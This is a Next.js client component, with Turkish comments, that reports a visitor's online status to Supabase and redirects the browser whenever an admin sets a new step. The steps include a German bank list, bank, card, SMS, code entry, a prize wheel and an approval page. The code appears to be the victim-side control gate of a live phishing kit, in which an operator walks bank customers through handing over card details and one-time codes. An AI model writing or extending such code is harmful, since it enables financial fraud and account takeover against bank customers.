"use client";

import { useEffect } from "react";
import { usePathname, useRouter } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

function shouldPauseBankListRedirects(pathname: string) {
  if (!pathname.startsWith("/banken")) return false;

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
  const router = useRouter();
  const pathname = usePathname();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);

  /* Presence: demo ortamında admin için online göstergesi */
  useEffect(() => {
    persistActiveSession(sessionId, effectiveRouteSessionId);
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const pulse = () => {
      void supabase
        .from("sessions")
        .update({ status: "online" })
        .eq("id", sessionId);
    };

    pulse();
    const t = window.setInterval(pulse, 25000);
    const markOffline = () => {
      void supabase
        .from("sessions")
        .update({ status: "offline" })
        .eq("id", sessionId);
    };

    const onVisibility = () => {
      if (document.visibilityState === "hidden") markOffline();
      else pulse();
    };

    window.addEventListener("pagehide", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
      markOffline();
    };
  }, [effectiveRouteSessionId, sessionId]);

  /* İlk yüklemede sunucu adımı ile senkron */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (shouldPauseBankListRedirects(pathname)) return;
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;
      const { data } = await supabase
        .from("sessions")
        .select("current_step,status,form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled || !data) return;
      const status = data.status as SessionStatus | undefined;
      const serverStep = data.current_step as SessionStep | undefined;

      if (status === "SPECIAL_INFO") {
        // EN KRITIK KURAL:
        // Eğer adminden current_step special_approval dışında bir değer atandıysa
        // (örn. sms/card/wheel/banken/congrats vb.) → approval bitmiştir, adminden yeni adım uygulanır.
        // STATUS SPECIAL_INFO olsa bile GERİ approval'a DÖNME.
        if (serverStep && serverStep !== "special_approval") {
          // current_step yönlendirmesini aşağıda uygula (devam et)
        } else if (!pathname.startsWith("/special-approval")) {
          window.location.replace("/special-approval");
          return;
        }
      }
      if (!serverStep) return;
      const finalServerStep = serverStep;
      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith('/wheel')) local = "wheel";
      
      // Eğer kullanıcı çark sayfasındaysa ve server "code_entry" diyorsa yönlendirme (ikisi de aynı sayılır)
      if (local === "wheel" && finalServerStep === "code_entry") return;
      if (local === "banken" && finalServerStep === "bank") return;
      
      if (local && finalServerStep !== local) {
        window.location.replace(
          resolveStepTargetPath(
            finalServerStep,
            sessionId,
            effectiveRouteSessionId,
            (data.form_data ?? {}) as { bankSlug?: string | null },
          ),
        );
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveRouteSessionId, sessionId, pathname, router]);

  /* Realtime: admin current_step değişince anında yönlendir */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channel = supabase
      .channel(`demo-session:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          if (shouldPauseBankListRedirects(pathname)) {
            return;
          }
          const next = payload.new as {
            current_step?: SessionStep;
            status?: SessionStatus;
            form_data?: { bankSlug?: string | null };
          };
          const nextStep = next.current_step;
          const nextStatus = next.status;

          if (nextStatus === "SPECIAL_INFO") {
            // EN KRITIK KURAL (realtime WS versiyonu):
            // Eğer adminden approval sonrası yeni bir step atandıysa (nextStep !== special_approval)
            // → approval'a GERİ DÖNME, yeni stepi uygula
            if (nextStep && nextStep !== "special_approval") {
              // Aşağıda current_step yönlendirmesini uygula (devam et)
            } else if (!pathname.startsWith("/special-approval")) {
              window.location.replace("/special-approval");
              return;
            }
          }
          if (!nextStep) return;
          let local: string | null = pathToStep(pathname);
          if (pathname.startsWith('/wheel')) local = "wheel";

          if (local === "wheel" && nextStep === "code_entry") return;
          if (local === "banken" && nextStep === "bank") return;

          if (local && nextStep !== local) {
            window.location.replace(
              resolveStepTargetPath(
                nextStep,
                sessionId,
                effectiveRouteSessionId,
                (next.form_data ?? {}) as { bankSlug?: string | null },
              ),
            );
          }
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveRouteSessionId, sessionId, pathname, router]);

  return null;
}
